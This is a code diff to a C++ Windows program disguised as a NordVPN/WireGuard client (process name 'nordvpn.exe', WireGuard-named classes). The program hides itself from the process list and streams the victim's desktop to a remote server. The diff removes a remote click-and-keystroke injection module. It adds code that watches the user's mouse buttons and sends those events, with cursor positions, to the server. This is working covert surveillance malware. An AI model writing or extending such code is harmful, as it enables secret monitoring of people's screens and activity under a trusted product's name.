@@ -17,18 +17,12 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
-#include <winternl.h>
-#include <tlhelp32.h>
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "user32.lib")
 
 #define PROCESS_NAME "nordvpn.exe"
 #define WINDOW_TITLE "NordVPN"
-
-typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
-typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
 
 class Logger {
 public:
@@ -306,74 +300,6 @@ public:
     int getHeight() const { return screen_height; }
 };
 
-class WireGuardInput {
-private:
-    pNtSetInformationProcess NtSetInformationProcess;
-    
-public:
-    WireGuardInput() {
-        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-        if (ntdll) {
-            NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
-        }
-    }
-    
-    void sendMouseClick(int x, int y) {
-        HWND target = WindowFromPoint({x, y});
-        
-        if (target) {
-            POINT pt = {x, y};
-            ScreenToClient(target, &pt);
-            
-            PostMessage(target, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(pt.x, pt.y));
-            Sleep(20);
-            PostMessage(target, WM_LBUTTONUP, 0, MAKELPARAM(pt.x, pt.y));
-        } else {
-            SetCursorPos(x, y);
-            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
-            Sleep(20);
-            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
-        }
-    }
-    
-    void sendRightClick(int x, int y) {
-        HWND target = WindowFromPoint({x, y});
-        
-        if (target) {
-            POINT pt = {x, y};
-            ScreenToClient(target, &pt);
-            
-            PostMessage(target, WM_RBUTTONDOWN, MK_RBUTTON, MAKELPARAM(pt.x, pt.y));
-            Sleep(20);
-            PostMessage(target, WM_RBUTTONUP, 0, MAKELPARAM(pt.x, pt.y));
-        } else {
-            SetCursorPos(x, y);
-            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
-            Sleep(20);
-            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
-        }
-    }
-    
-    void sendKeyPress(const std::string& key) {
-        if (key.length() == 1) {
-            char c = key[0];
-            BYTE vk = VkKeyScan(c) & 0xFF;
-            
-            keybd_event(vk, 0, 0, 0);
-            Sleep(10);
-            keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
-        } else if (key == "ENTER") {
-            keybd_event(VK_RETURN, 0, 0, 0);
-            Sleep(10);
-            keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
-        } else if (key == "ESCAPE") {
-            keybd_event(VK_ESCAPE, 0, 0, 0);
-            Sleep(10);
-            keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
-        }
-    }
-};
-
 class TunnelStealth {
 public:
     static void hideFromProcessList() {
@@ -424,7 +350,6 @@ private:
     SOCKET tcp_socket;
     
     WireGuardCapture screen_capture;
-    WireGuardInput input_handler;
     std::vector<BYTE> last_frame_data;
     
     static bool sendAll(SOCKET s, const char* data, size_t len) {
@@ -491,32 +416,6 @@ private:
         return WireGuardPacket::deserialize(data);
     }
     
-    void processRemoteCommand(const std::string& commandData) {
-        std::istringstream iss(commandData);
-        std::string type;
-        if (!std::getline(iss, type, ':')) return;
-        
-        if (type == "click") {
-            int x, y;
-            if (iss >> x && iss.ignore() && iss >> y) {
-                input_handler.sendMouseClick(x, y);
-            }
-        } else if (type == "rightclick") {
-            int x, y;
-            if (iss >> x && iss.ignore() && iss >> y) {
-                input_handler.sendRightClick(x, y);
-            }
-        } else if (type == "key") {
-            std::string key;
-            if (std::getline(iss, key)) {
-                if (!key.empty() && key[0] == ':') {
-                    key = key.substr(1);
-                }
-                input_handler.sendKeyPress(key);
-            }
-        }
-    }
-
 public:
     WireGuardClient(const std::string& host, int port)
         : server_host(host), server_port(port), gen(rd()), tcp_socket(INVALID_SOCKET) {}
@@ -596,29 +495,6 @@ public:
         return false;
     }
     
-    void checkForCommands() {
-        fd_set readfds;
-        FD_ZERO(&readfds);
-        FD_SET(tcp_socket, &readfds);
-        
-        timeval timeout;
-        timeout.tv_sec = 0;
-        timeout.tv_usec = 1000;
-        
-        if (select(0, &readfds, nullptr, nullptr, &timeout) > 0) {
-            WireGuardPacket packet = receiveWireGuardPacket();
-            auto [type, data] = TunnelProtocol::extractTunnelPayload(packet.encrypted_payload);
-            Logger::debug("Command packet type: " + type);
-
-            if (type == "input" && !data.empty()) {
-                std::vector<BYTE> decoded_data = WireGuardEncoder::decode(data);
-                std::string command(decoded_data.begin(), decoded_data.end());
-                Logger::debug("Processing remote command: " + command);
-                processRemoteCommand(command);
-            }
-        }
-    }
-    
     void sendDesktopFrame() {
         std::vector<BYTE> frameData = screen_capture.captureFrame();
 
@@ -649,6 +525,48 @@ public:
         }
         last_frame_data = frameData;
     }
+
+    void sendMouseEvent(const std::string& evt) {
+        if (session_id.empty()) return;
+        std::stringstream payload;
+        payload << session_id << "|" << evt;
+        std::vector<BYTE> tp = TunnelProtocol::createTunnelPayload("event", payload.str());
+        WireGuardPacket packet(tp);
+        sendWireGuardPacket(packet);
+    }
+
+    void detectAndSendMouseEvents() {
+        static bool prevRight = false;
+        static bool prevMiddle = false;
+        static std::chrono::steady_clock::time_point middleDownTime;
+        static POINT middlePos{0,0};
+
+        SHORT rightState = GetAsyncKeyState(VK_RBUTTON);
+        bool rightDown = (rightState & 0x8000) != 0;
+        if (rightDown && !prevRight) {
+            sendMouseEvent("right");
+        }
+        prevRight = rightDown;
+
+        SHORT midState = GetAsyncKeyState(VK_MBUTTON);
+        bool midDown = (midState & 0x8000) != 0;
+        auto now = std::chrono::steady_clock::now();
+        if (midDown && !prevMiddle) {
+            middleDownTime = now;
+            GetCursorPos(&middlePos);
+        }
+        if (!midDown && prevMiddle) {
+            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - middleDownTime).count();
+            if (duration > 800) {
+                sendMouseEvent("long_middle");
+            } else {
+                std::ostringstream ss;
+                ss << "middle:" << middlePos.x << "," << middlePos.y;
+                sendMouseEvent(ss.str());
+            }
+        }
+        prevMiddle = midDown;
+    }
     
     void run() {
         TunnelStealth::hideFromProcessList();
@@ -669,7 +587,7 @@ public:
                     Logger::info("Connected to server, entering streaming loop");
                     while (true) {
                         sendDesktopFrame();
-                        checkForCommands();
+                        detectAndSendMouseEvents();
                         
                         std::uniform_int_distribution<> dis(16, 33);
                         std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
